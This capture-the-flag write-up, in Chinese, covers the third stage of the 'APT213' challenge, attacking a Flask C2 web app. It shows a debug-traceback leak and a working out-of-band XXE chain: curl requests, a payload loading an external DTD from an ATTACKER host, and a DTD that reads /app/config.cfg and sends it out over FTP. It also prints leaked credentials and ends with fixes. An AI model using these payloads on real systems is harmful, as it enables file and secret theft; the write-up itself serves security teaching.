# APT213 - The hidden part of the iceberg

## 题目简述

这是 APT213 连续场景的第三部分。上一题逆向得到的恶意程序会向 Tor 隐藏服务上的 Flask C2 发送 XML；本题要求利用该 Web 应用泄露配置和受害主机的敏感信息。

源码中 C2 Agent 接口使用如下解析器：

```python
xml_parser = XMLParser(no_network=False, load_dtd=True, huge_tree=True)
```

它允许加载外部 DTD 和网络资源，同时应用把 `DEBUG` 保持为开启状态。`/beacon` 与 `/response` 只检查恶意程序特有的 User-Agent 和 XML Content-Type，没有禁用实体解析。由此形成“调试信息确定服务端路径，再用带外 XXE 读取配置”的完整链路。官方在 [APT213 场景总览](https://github.com/Shellmates/BSides-Algiers-2k21-CTF-Quals/pull/11) 中也明确说明：本阶段需要把 Debug 信息与 OOB XXE 组合起来，配置中的 secret 随后可用于取得 John 主机的私钥。

## 解题过程

先沿用上一阶段恢复出的恶意程序 User-Agent：

```text
N0x1ous F0x S3cr3t Ag3nt v2.1.3
```

向 `/beacon` 发送缺少必需节点的 XML。代码直接对 XPath 结果取 `[0]`，因此会触发未捕获的 `IndexError`；Debug 页面会显示 traceback，并暴露应用脚本位于 `/app/app.py`：

```bash
curl -i -X POST http://TARGET/beacon \
  -H 'User-Agent: N0x1ous F0x S3cr3t Ag3nt v2.1.3' \
  -H 'Content-Type: application/xml' \
  --data '<Beacon/>'
```

由于 Agent 接口本身不回显解析后的节点内容，直接把 `file:///app/config.cfg` 放入普通实体只能让数据进入服务端对象，不能把结果带回。需要在攻击者服务器上准备外部 DTD，让目标主动连接外带接收端。主请求可以写成：

```xml
<?xml version="1.0"?>
<!DOCTYPE Beacon [
  <!ENTITY % remote SYSTEM "http://ATTACKER:8000/leak.dtd">
  %remote;
]>
<Beacon>
  <Time>0</Time>
  <CurrentUser>probe</CurrentUser>
  <HostName>probe</HostName>
  <InternalIP>127.0.0.1</InternalIP>
  <ExternalIP>127.0.0.1</ExternalIP>
</Beacon>
```

`leak.dtd` 读取 `/app/config.cfg`，再把文件内容嵌入目标主动发起的请求：

```dtd
<!ENTITY % file SYSTEM "file:///app/config.cfg">
<!ENTITY % stage "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">
%stage;
%exfil;
```

将 XML 以同样的两个请求头提交到 `/beacon`：

```bash
curl -X POST http://TARGET/beacon \
  -H 'User-Agent: N0x1ous F0x S3cr3t Ag3nt v2.1.3' \
  -H 'Content-Type: application/xml' \
  --data-binary @payload.xml
```

配置是多行文本，并含空格、引号、`#`、`?` 等 URI 特殊字符。简单的 `http://ATTACKER/?data=%file;` 可能因 URI 解析或截断而丢失内容，因此应使用能记录原始 FTP 命令的 XXE 接收端，或使用能在服务端完成安全编码的等价外带通道，不能把一次 DNS/HTTP 回连当成“已完整读取文件”。

泄露出的配置包含：

```python
DEBUG = True
SECRET_KEY = "shellmates{sH1t_why_d1dnt_w3_juSt_st1ck_t0_js0n_4nd_d1s4bl3_d3bug?!}"
USER_AGENT = "N0x1ous F0x S3cr3t Ag3nt v2.1.3"
USERNAME = "master"
PASSWORD = "w3h4ck4pr0f1tfr0mth3und3rgr0und"
DB_FILE = "db.sqlite"
```

因此本阶段 flag 就是 `SECRET_KEY`：

```text
shellmates{sH1t_why_d1dnt_w3_juSt_st1ck_t0_js0n_4nd_d1s4bl3_d3bug?!}
```

若继续完成场景链，可用泄露的 `master` 凭据调用 `/auth` 获取 JWT，再请求 `/hosts` 枚举主机，并访问 `/host/<id>/privkey` 取得 John 主机的 RSA 私钥，为第四阶段的文件解密做准备。

## 方法总结

本题的关键是区分三个层次：Debug 页面只负责提供内部路径和代码上下文；XML 外部实体负责读取文件；OOB 通道负责把无回显接口中的内容送回攻击者。仅证明解析器会访问外部 URL，并不等于已经完整外带了配置。

修复时应关闭生产环境 Debug，使用禁止 DTD、外部实体和网络访问的 XML 解析配置，并对 Agent 请求的 XML 结构做严格 schema 校验。C2 的认证秘密、管理凭据和 flag 也不应共存于 Web 进程可读的同一配置文件中。
